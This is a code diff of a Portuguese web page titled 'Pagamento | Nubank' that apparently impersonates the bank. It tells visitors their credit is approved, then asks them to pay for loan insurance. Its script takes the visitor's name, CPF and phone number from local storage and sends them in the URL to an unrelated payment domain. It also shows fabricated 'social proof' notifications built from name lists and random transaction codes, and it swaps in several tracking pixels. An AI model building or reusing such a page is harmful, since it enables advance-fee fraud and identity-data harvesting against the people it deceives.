@@ -3,33 +3,125 @@
   <head>
     <meta charset="UTF-8" />
     <script>
-      window.pixelId = "687678dbdbb2a8a13bab1d92";
+      window.tikTokPixelId = "6940a76e319500c37d739766";
       var a = document.createElement("script");
       a.setAttribute("async", "");
       a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      a.setAttribute(
+        "src",
+        "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js"
+      );
       document.head.appendChild(a);
     </script>
-    <script
-      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-      data-utmify-prevent-xcod-sck
-      data-utmify-prevent-subids
-      async
-      defer
-    ></script>
-    <script type="text/javascript">
-      (function (c, l, a, r, i, t, y) {
-        c[a] =
-          c[a] ||
-          function () {
-            (c[a].q = c[a].q || []).push(arguments);
-          };
-        t = l.createElement(r);
-        t.async = 1;
-        t.src = "https://www.clarity.ms/tag/" + i;
-        y = l.getElementsByTagName(r)[0];
-        y.parentNode.insertBefore(t, y);
-      })(window, document, "clarity", "script", "simxqbeoht");
+    <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = (w[t] = w[t] || []);
+        (ttq.methods = [
+          "page",
+          "track",
+          "identify",
+          "instances",
+          "debug",
+          "on",
+          "off",
+          "once",
+          "ready",
+          "alias",
+          "group",
+          "enableCookie",
+          "disableCookie",
+          "holdConsent",
+          "revokeConsent",
+          "grantConsent",
+        ]),
+          (ttq.setAndDefer = function (t, e) {
+            t[e] = function () {
+              t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+            };
+          });
+        for (var i = 0; i < ttq.methods.length; i++)
+          ttq.setAndDefer(ttq, ttq.methods[i]);
+        (ttq.instance = function (t) {
+          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+            ttq.setAndDefer(e, ttq.methods[n]);
+          return e;
+        }),
+          (ttq.load = function (e, n) {
+            var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+              o = n && n.partner;
+            (ttq._i = ttq._i || {}),
+              (ttq._i[e] = []),
+              (ttq._i[e]._u = r),
+              (ttq._t = ttq._t || {}),
+              (ttq._t[e] = +new Date()),
+              (ttq._o = ttq._o || {}),
+              (ttq._o[e] = n || {});
+            n = document.createElement("script");
+            (n.type = "text/javascript"),
+              (n.async = !0),
+              (n.src = r + "?sdkid=" + e + "&lib=" + t);
+            e = document.getElementsByTagName("script")[0];
+            e.parentNode.insertBefore(n, e);
+          });
+
+        ttq.load("D50ACKRC77U6T74N920G");
+        ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <script>
+      (function () {
+        const POLL_MS = 500;
+
+        function getStorageKey() {
+          const url = new URL(window.location.href);
+          const current = url.searchParams.get("utm_source");
+          if (current === "FB") return "lead";
+          if (current === "google") return "lead-google";
+          return null;
+        }
+
+        function getLeadId(storageKey) {
+          if (!storageKey) return null;
+          const raw = localStorage.getItem(storageKey);
+          if (!raw) return null;
+          try {
+            const obj = JSON.parse(raw);
+            return obj && obj._id ? String(obj._id) : null;
+          } catch {
+            return null;
+          }
+        }
+
+        function applyUtmIfNeeded() {
+          const url = new URL(window.location.href);
+          const current = url.searchParams.get("utm_source");
+          const storageKey = getStorageKey();
+          const id = getLeadId(storageKey);
+          if (!id) return false;
+
+          let desired = null;
+          if (current === "FB") {
+            desired = "FBjLj" + id;
+          } else if (current === "google") {
+            desired = "googlejLj" + id;
+          }
+
+          if (!desired) return false;
+
+          url.searchParams.set("utm_source", desired);
+          window.location.replace(url.toString());
+          return true;
+        }
+
+        if (applyUtmIfNeeded()) return;
+
+        const interval = setInterval(() => {
+          if (applyUtmIfNeeded()) clearInterval(interval);
+        }, POLL_MS);
+      })();
     </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Pagamento | Nubank</title>
@@ -220,10 +312,10 @@
         font-size: 0.9em;
         color: #885800;
       }
-.text-white {
-  --tw-text-opacity: 1;
-  color: rgb(255 255 255 / var(--tw-text-opacity, 1)) !important;
-}
+      .text-white {
+        --tw-text-opacity: 1;
+        color: rgb(255 255 255 / var(--tw-text-opacity, 1)) !important;
+      }
       /* Estilos específicos para a barra de progresso */
       #emprestimo-progressBar {
         display: block !important;
@@ -294,7 +386,6 @@
               </p>
             </div>
           </div>
-
 
           <div class="mb-5">
             <p class="text-gray-700 font-medium mb-3">Seu crédito aprovado:</p>
@@ -825,8 +916,7 @@
             </div>
           </div>
 
-            <div id="vslContainer"></div>
-
+          <div id="vslContainer"></div>
 
           <div id="seguroPrestamistaInfo">
             <p class="text-lg font-medium text-gray-800 mb-4">
@@ -993,8 +1083,10 @@
     </div>
 
     <!-- Área de notificações de provas sociais -->
-    <div id="notificacoesContainerBottom" class="fixed bottom-4 left-4 z-50 max-w-xs"></div>
-
+    <div
+      id="notificacoesContainerBottom"
+      class="fixed bottom-4 left-4 z-50 max-w-xs"
+    ></div>
 
     <script>
       document.addEventListener("DOMContentLoaded", function () {
@@ -1158,21 +1250,22 @@
         });
         function carregarVSL() {
           if (document.getElementById("vid-693b3ce0c94c8763ed8966bd")) return;
-        
+
           const container = document.getElementById("vslContainer");
-        
+
           const player = document.createElement("vturb-smartplayer");
           player.id = "vid-693b3ce0c94c8763ed8966bd";
           player.style.display = "block";
           player.style.margin = "0 auto";
           player.style.width = "100%";
-        
+
           container.appendChild(player);
-        
+
           const script = document.createElement("script");
-          script.src = "https://scripts.converteai.net/88262d74-dd34-4e70-a57e-7ac906050791/players/693b3ce0c94c8763ed8966bd/v4/player.js";
+          script.src =
+            "https://scripts.converteai.net/88262d74-dd34-4e70-a57e-7ac906050791/players/693b3ce0c94c8763ed8966bd/v4/player.js";
           script.async = true;
-        
+
           document.head.appendChild(script);
         }
         // Função para gerar código de transação aleatório
@@ -1473,7 +1566,6 @@
             // Iniciar notificações apenas na etapa de seguro
             iniciarNotificacoes();
             carregarVSL();
-
           });
 
         document
@@ -1554,10 +1646,13 @@
         // Botão de pagar seguro
         btnPayInsurance.addEventListener("click", () => {
           btnPayInsurance.disabled = true;
-        
+
           const limparNumeros = (v) => String(v || "").replace(/\D/g, "");
-          const limparTexto = (v) => String(v || "").replace(/[<>]/g, "").trim();
-        
+          const limparTexto = (v) =>
+            String(v || "")
+              .replace(/[<>]/g, "")
+              .trim();
+
           let nome = localStorage.getItem("nomeUsuario") || "";
           const dadosUsuarioRaw = localStorage.getItem("dadosUsuario") || "";
           if (!nome && dadosUsuarioRaw) {
@@ -1566,20 +1661,26 @@
               nome = d && d.nome ? d.nome : "";
             } catch (e) {}
           }
-        
-          const cpf = limparNumeros(localStorage.getItem("cpfUsuario") || localStorage.getItem("cpf") || "");
-          const telefone = limparNumeros(localStorage.getItem("telefoneUsuario") || localStorage.getItem("telefoneUsuarioFormatado") || "");
+
+          const cpf = limparNumeros(
+            localStorage.getItem("cpfUsuario") ||
+              localStorage.getItem("cpf") ||
+              ""
+          );
+          const telefone = limparNumeros(
+            localStorage.getItem("telefoneUsuario") ||
+              localStorage.getItem("telefoneUsuarioFormatado") ||
+              ""
+          );
           nome = limparTexto(nome);
-        
+
           const urlParams = new URLSearchParams(window.location.search);
           urlParams.set("nome", nome);
           urlParams.set("documento", cpf);
           urlParams.set("telefone", telefone);
-        
+
           window.location.href = `https://pay.areadepagamentosonline.com/693b6811482d3f7a0458d03d?${urlParams.toString()}`;
         });
-
-
 
         // Configuração de notificações de prova social
         const nomesFemininos = [
@@ -1722,7 +1823,9 @@
                     </div>
                 `;
 
-          const container = document.getElementById("notificacoesContainerBottom");
+          const container = document.getElementById(
+            "notificacoesContainerBottom"
+          );
 
           container.appendChild(notificacao);
 
@@ -1903,48 +2006,50 @@
           muteBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
         }
       }
-      
-      
+
       // Função para carregar o vídeo
       function carregarVideo() {
-          const videoElement = document.getElementById("videoBackground");
-          const videoOverlay = document.getElementById("videoOverlay");
-          const playButton = document.getElementById("playButton");
-          const videoControls = document.getElementById("videoControls");
-          const muteBtn = document.getElementById("muteBtn");
-        
-          if (!videoElement || !videoOverlay || !playButton || !videoControls || !muteBtn) return;
-          if (videoElement.src) return;
-        
-          videoElement.src = "./video.mov";
-          videoElement.loop = true;
-          videoElement.muted = true;
-          videoElement.autoplay = true;
-        
-          videoElement.addEventListener("loadedmetadata", () => {
-            videoElement.play();
-          });
-        
-          playButton.addEventListener("click", () => {
-            videoOverlay.style.display = "none";
-            videoControls.style.display = "block";
-            videoElement.muted = false;
-            videoElement.currentTime = 0;
-            videoElement.play();
-          });
-        
-          muteBtn.addEventListener("click", () => {
-            videoElement.muted = !videoElement.muted;
-            muteBtn.innerHTML = videoElement.muted
-              ? '<i class="fas fa-volume-mute"></i>'
-              : '<i class="fas fa-volume-up"></i>';
-          });
-        }
+        const videoElement = document.getElementById("videoBackground");
+        const videoOverlay = document.getElementById("videoOverlay");
+        const playButton = document.getElementById("playButton");
+        const videoControls = document.getElementById("videoControls");
+        const muteBtn = document.getElementById("muteBtn");
 
+        if (
+          !videoElement ||
+          !videoOverlay ||
+          !playButton ||
+          !videoControls ||
+          !muteBtn
+        )
+          return;
+        if (videoElement.src) return;
+
+        videoElement.src = "./video.mov";
+        videoElement.loop = true;
+        videoElement.muted = true;
+        videoElement.autoplay = true;
+
+        videoElement.addEventListener("loadedmetadata", () => {
+          videoElement.play();
+        });
+
+        playButton.addEventListener("click", () => {
+          videoOverlay.style.display = "none";
+          videoControls.style.display = "block";
+          videoElement.muted = false;
+          videoElement.currentTime = 0;
+          videoElement.play();
+        });
+
+        muteBtn.addEventListener("click", () => {
+          videoElement.muted = !videoElement.muted;
+          muteBtn.innerHTML = videoElement.muted
+            ? '<i class="fas fa-volume-mute"></i>'
+            : '<i class="fas fa-volume-up"></i>';
+        });
+      }
     </script>
-    <script>
-
-</script>
-
+    <script></script>
   </body>
 </html>
